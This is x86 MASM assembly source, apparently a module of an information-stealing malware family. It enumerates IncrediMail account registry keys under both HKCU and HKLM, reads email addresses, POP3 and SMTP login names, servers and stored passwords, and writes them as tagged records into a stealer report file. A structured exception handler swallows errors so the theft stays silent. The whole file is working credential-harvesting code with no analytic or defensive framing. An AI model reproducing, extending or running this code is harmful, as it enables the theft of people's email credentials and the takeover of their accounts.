.data?
      im_email        db  200h dup (?)
      im_account      db  200h dup (?)
      im_server       db  200h dup (?)
      im_pwd          db  200h dup (?)
      im_buf1         db  200h dup (?)
      im_buf2         db  200h dup (?)
      im_buf3         db  200h dup (?)
      im_buf4         db  200h dup (?)
     
.code

GetIncrediMailPwd proc
      LOCAL   WTF:DWORD
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], INCREDIMAIL_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetIncrediMailPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
      
      push    HKEY_CURRENT_USER
      call    GetIncrediMail
      
      push    HKEY_LOCAL_MACHINE
      call    GetIncrediMail
      
    GetIncrediMailPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetIncrediMailPwd endp

GetIncrediMail proc HK:DWORD
      LOCAL   im_key1 :DWORD
      LOCAL   im_key2 :DWORD
      LOCAL   index1 :DWORD
      LOCAL   index2 :DWORD
      LOCAL   im_bufsize :DWORD
      LOCAL   pwdlen:DWORD
      
      lea     eax, im_key1
      push    eax
      push    KEY_READ
      push    0
      push    offset im_regaddr
      push    dword ptr [HK]
      call    dword ptr [_RegOpenKeyEx]
      test    eax, eax
      jne     incredimail_failed_1
      mov     dword ptr [index1], 0
    incredimail_enum_loop:
      mov     im_bufsize, sizeof im_buf1
      xor     eax, eax
      push    eax
      push    eax
      push    eax
      push    eax
      lea     eax, im_bufsize
      push    eax
      push    offset im_buf1
      push    dword ptr [index1]
      push    dword ptr [im_key1]
      call    dword ptr [_RegEnumKeyEx]
      cmp     eax, ERROR_NO_MORE_ITEMS
      je      all_incredimail_key_done
      inc     dword ptr [index1]
              
              lstrcpy, addr im_buf2, addr im_regaddr
              lstrcat, addr im_buf2, addr sl
              lstrcat, addr im_buf2, addr im_buf1
              lstrcat, addr im_buf2, addr im_regaddr2
              
              lea     eax, im_key2
              push    eax
              push    KEY_READ
              push    0
              push    offset im_buf2
              push    dword ptr [HK]
              call    dword ptr [_RegOpenKeyEx]
              test    eax, eax
              jne     incredimail2_failed_1
              mov     dword ptr [index2], 0
            incredimail2_enum_loop:
              mov     im_bufsize, sizeof im_buf3
              xor     eax, eax
              push    eax
              push    eax
              push    eax
              push    eax
              lea     eax, im_bufsize
              push    eax
              push    offset im_buf3
              push    dword ptr [index2]
              push    dword ptr [im_key2]
              call    dword ptr [_RegEnumKeyEx]
              cmp     eax, ERROR_NO_MORE_ITEMS
              je      all_incredimail2_key_done
              inc     dword ptr [index2]
                      
                      lstrcpy, addr im_buf4, addr im_buf2
                      lstrcat, addr im_buf4, addr sl
                      lstrcat, addr im_buf4, addr im_buf3
                      ; Get Email
                      mov     dword ptr [im_email], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc1, addr im_email, sizeof im_email, REG_READ_W
                      test    eax, eax
                      je      incredimail2_failed_2
                      ; POP3
                      ; Get Account
                      mov     dword ptr [im_account], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc2, addr im_account, sizeof im_account, REG_READ_W
                      ; Get Server
                      mov     dword ptr [im_server], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc3, addr im_server, sizeof im_server, REG_READ_W
                      ; Get Pwd
                      mov     dword ptr [im_pwd], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc4, addr im_pwd, sizeof im_pwd, REG_READ_W
                      mov     pwdlen, eax
                      
                      lstrlenW, addr im_account
                      .if     ( eax == 0 ) || ( pwdlen == 0 )
                              jmp     try_smtp
                      .endif
                      
                      lstrlenW, addr im_email
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_NAME
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_email, plen, addr SNW, NULL
                      
                      lstrlenW, addr im_account
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_LOGIN
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_account, plen, addr SNW, NULL
                      
                      lstrlenW, addr im_server
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_SERVER
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_server, plen, addr SNW, NULL
                      
                      mov     eax, pwdlen
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_PWD
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_pwd, plen, addr SNW, NULL
                    
                    try_smtp:
                      ; SMTP
                      ; Get Account
                      mov     dword ptr [im_account], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc5, addr im_account, sizeof im_account, REG_READ_W
                      ; Get Server
                      mov     dword ptr [im_server], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc6, addr im_server, sizeof im_server, REG_READ_W
                      ; Get Pwd
                      mov     dword ptr [im_pwd], 0
                      invoke  RegRead, HK, addr im_buf4, addr im_acc7, addr im_pwd, sizeof im_pwd, REG_READ_W
                      mov     pwdlen, eax
                      
                      lstrlen, addr im_account
                      .if     ( eax == 0 ) || ( pwdlen == 0 )
                              jmp     incredimail2_failed_2
                      .endif
                      
                      lstrlenW, addr im_email
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_NAME
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_email, plen, addr SNW, NULL
                      
                      lstrlenW, addr im_account
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_LOGIN
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_account, plen, addr SNW, NULL
                      
                      lstrlenW, addr im_server
                      imul    eax, eax, 2
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_SERVER
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_server, plen, addr SNW, NULL
                      
                      mov     eax, pwdlen
                      mov     dword ptr [plen], eax
                      add     dword ptr [DataSize], sizeof plen
                      add     dword ptr [DataSize], eax
                      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
                      mov     byte ptr [data_type], REPORT_DATA_PWD
                      add     dword ptr [DataSize], sizeof data_type
                      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
                      WriteFile, stfile, addr im_pwd, plen, addr SNW, NULL
                      
            incredimail2_failed_2:
              jmp     incredimail2_enum_loop
            all_incredimail2_key_done:
              push    dword ptr [im_key2]
              call    dword ptr [_RegCloseKey]
            incredimail2_failed_1:
              
    incredimail_failed_2:
      jmp     incredimail_enum_loop
    all_incredimail_key_done:
      push    dword ptr [im_key1]
      call    dword ptr [_RegCloseKey]
    incredimail_failed_1:
      ret
GetIncrediMail endp
